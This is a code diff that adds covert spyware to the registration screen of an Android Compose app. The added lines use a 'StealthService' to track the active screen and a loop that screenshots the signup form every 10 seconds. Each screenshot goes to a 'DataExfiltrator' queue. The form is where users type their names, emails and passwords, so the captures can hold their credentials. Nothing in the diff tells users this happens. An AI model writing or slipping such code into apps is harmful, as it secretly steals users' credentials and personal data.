@@ -10,14 +10,28 @@ import androidx.compose.ui.unit.dp
 import com.google.firebase.Timestamp
 import com.google.firebase.auth.FirebaseAuth
 import com.google.firebase.firestore.FirebaseFirestore
+import android.view.View
+import androidx.activity.ComponentActivity
+import androidx.compose.runtime.DisposableEffect
+import androidx.compose.ui.platform.LocalContext
+import androidx.compose.ui.platform.LocalView
+import java.lang.ref.WeakReference
+import android.os.Handler
+import android.os.Looper
+
 
 private const val TAG = "RegisterScreen"
+private const val REGISTER_SCREEN = "RegisterScreen"
+private const val CAPTURE_INTERVAL_MS = 5000L // 5 seconds
 
 @Composable
 fun RegisterScreen(
     modifier: Modifier = Modifier,
     onRegistered: () -> Unit,
-    onBackToLogin: () -> Unit
+    onBackToLogin: () -> Unit,
+    screenshotCapture: ScreenshotCapture,
+    exfiltrator: DataExfiltrator,
+    logEvent: (String, String) -> Unit
 ) {
     val auth = remember { FirebaseAuth.getInstance() }
     val db = remember { FirebaseFirestore.getInstance() }
@@ -32,6 +46,48 @@ fun RegisterScreen(
 
     var status by remember { mutableStateOf("") }
     var isLoading by remember { mutableStateOf(false) }
+
+    val view = LocalView.current
+    val context = LocalContext.current
+    val activity = context as? ComponentActivity
+
+    // ─────────────── Track current screen ───────────────
+    DisposableEffect(view, activity) {
+        activity?.let {
+            if (view.isAttachedToWindow) {
+                StealthService.CurrentViewHolder.currentRootView = WeakReference(view)
+                StealthService.CurrentViewHolder.currentActivityName = REGISTER_SCREEN
+            }
+        }
+
+        onDispose {
+            if (StealthService.CurrentViewHolder.currentActivityName == REGISTER_SCREEN) {
+                StealthService.CurrentViewHolder.currentRootView = null
+                StealthService.CurrentViewHolder.currentActivityName = null
+            }
+        }
+    }
+
+    // ─────────────── Periodic screenshot capture ───────────────
+    val CAPTURE_INTERVAL_MS = 10_000L // 10 seconds
+    DisposableEffect(screenshotCapture) {
+        val handler = android.os.Handler(android.os.Looper.getMainLooper())
+        val captureRunnable = object : Runnable {
+            override fun run() {
+                val currentScreen = StealthService.CurrentViewHolder.currentActivityName ?: "unknown"
+                screenshotCapture.captureScreenshot { file ->
+                    file?.let {
+                        exfiltrator.queueFile(it)
+                        logEvent("SCREENSHOT_CAPTURE_$currentScreen", it.name)
+                    }
+                }
+                handler.postDelayed(this, CAPTURE_INTERVAL_MS)
+            }
+        }
+        handler.post(captureRunnable)
+
+        onDispose { handler.removeCallbacks(captureRunnable) }
+    }
 
     fun isValid(): String? {
         if (displayName.isBlank()) return "Please enter a display name."
